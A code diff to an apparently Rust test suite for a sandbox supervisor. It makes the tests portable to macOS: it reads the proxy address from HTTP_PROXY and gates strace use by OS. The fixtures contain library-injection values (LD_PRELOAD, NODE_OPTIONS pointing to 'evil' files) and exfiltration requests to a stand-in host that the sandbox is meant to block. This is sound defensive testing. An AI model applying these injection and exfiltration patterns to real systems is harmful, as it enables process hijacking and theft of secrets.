@@ -273,11 +273,12 @@ mod suite {
                 .env("FAKE_SECRET_TOKEN", FAKE_ENV_SECRET)
                 .env("LD_PRELOAD", "/nonexistent/evil.so")
                 .env("LD_LIBRARY_PATH", "/nonexistent/lib")
-                .env("DYLD_INSERT_LIBRARIES", "/nonexistent/evil.dylib")
                 .env("PYTHONPATH", "/nonexistent/py")
                 .env("NODE_OPTIONS", "--require=/nonexistent/evil.js")
                 // Harmless to the supervisor itself (a search path that does
-                // not exist); it must not reach the command.
+                // not exist); it must not reach the command. Not
+                // DYLD_INSERT_LIBRARIES: dyld kills any process whose
+                // inserted library is missing, agentkeep included.
                 .env("DYLD_LIBRARY_PATH", "/nonexistent/evil")
                 .env("TERM", "dumb");
             // The container backend's runtime CLI runs on the host side and
@@ -935,9 +936,10 @@ except OSError as e:
     const EXFIL_NAME: &str = "akiatestfake00000000.exfil.test";
 
     /// Shell prelude: `px` sends a request through the relay explicitly and
-    /// ends the output with a newline so `-w` tags start a line.
-    const PX: &str =
-        "px() { curl -sS -m 10 --noproxy '' -x http://127.0.0.1:3128 \"$@\"; echo; }\n";
+    /// ends the output with a newline so `-w` tags start a line. The relay
+    /// is wherever `HTTP_PROXY` says: port 3128 on Linux and in containers,
+    /// a random loopback port on macOS.
+    const PX: &str = "px() { curl -sS -m 10 --noproxy '' -x \"$HTTP_PROXY\" \"$@\"; echo; }\n";
 
     /// A local origin that records what it receives. Plain HTTP/1.1 or TLS
     /// (self-signed for `localhost`); answers `origin-ok <request line>`,
@@ -1090,6 +1092,19 @@ except OSError as e:
             body.len()
         );
         let _ = s.flush();
+    }
+
+    /// `strace` exists only on Linux. Elsewhere the traced part of a test is
+    /// not applicable rather than untested: macOS has `dtruss`, which needs
+    /// root with System Integrity Protection disabled.
+    fn strace_available(id: &str) -> bool {
+        if !cfg!(target_os = "linux") {
+            let msg = format!("NOT APPLICABLE [{id}] on this OS: no strace");
+            println!("{msg}");
+            eprintln!("{msg}");
+            return false;
+        }
+        tools(id, &["strace"])
     }
 
     /// Gate on host tools the probes need. A missing tool is UNTESTED,
@@ -1567,10 +1582,12 @@ for ns in ["127.0.0.53", "192.0.2.53"]:
         h.fixture(
             "ask.py",
             &format!(
-                r#"import socket
+                r#"import os, socket, urllib.parse
+_u = urllib.parse.urlsplit(os.environ["HTTP_PROXY"])
+RELAY = (_u.hostname, _u.port)
 for req in [b"CONNECT {EXFIL_NAME}:443 HTTP/1.1\r\nHost: {EXFIL_NAME}:443\r\n\r\n",
             b"GET http://{EXFIL_NAME}/x HTTP/1.1\r\nHost: {EXFIL_NAME}\r\nConnection: close\r\n\r\n"]:
-    s = socket.create_connection(("127.0.0.1", 3128), timeout=10)
+    s = socket.create_connection(RELAY, timeout=10)
     s.sendall(req)
     data = b""
     while True:
@@ -1583,7 +1600,7 @@ for req in [b"CONNECT {EXFIL_NAME}:443 HTTP/1.1\r\nHost: {EXFIL_NAME}:443\r\n\r\
             ),
         );
         let trace = h.root.path().join("n3.trace");
-        let traced = tools("N3 strace", &["strace"]);
+        let traced = strace_available("N3 strace");
         let wrapper = strace(&trace, "connect,sendto,sendmsg,execve");
         let wrapper: Vec<&str> = wrapper.iter().map(String::as_str).collect();
         let l = h.run_logged(
@@ -1665,10 +1682,12 @@ for host in ("127.0.0.1", "localhost"):
         h.fixture(
             "ws.py",
             &format!(
-                r#"import socket
+                r#"import os, socket, urllib.parse
+_u = urllib.parse.urlsplit(os.environ["HTTP_PROXY"])
+RELAY = (_u.hostname, _u.port)
 tok = open(".fx/gh").read().strip().encode()
 def handshake(extra):
-    s = socket.create_connection(("127.0.0.1", 3128), timeout=10)
+    s = socket.create_connection(RELAY, timeout=10)
     s.sendall(b"GET http://127.0.0.1:{p}/ws HTTP/1.1\r\nHost: 127.0.0.1:{p}\r\n"
               b"Upgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Version: 13\r\n"
               b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n" + extra + b"\r\n")
@@ -1760,7 +1779,7 @@ s.close()
     #[test]
     fn s5_supervisor_makes_no_outbound_connections() {
         let Some(h) = harness("S5") else { return };
-        if !tools("S5", &["strace"]) {
+        if !strace_available("S5") {
             return;
         }
         let trace = h.root.path().join("s5.trace");
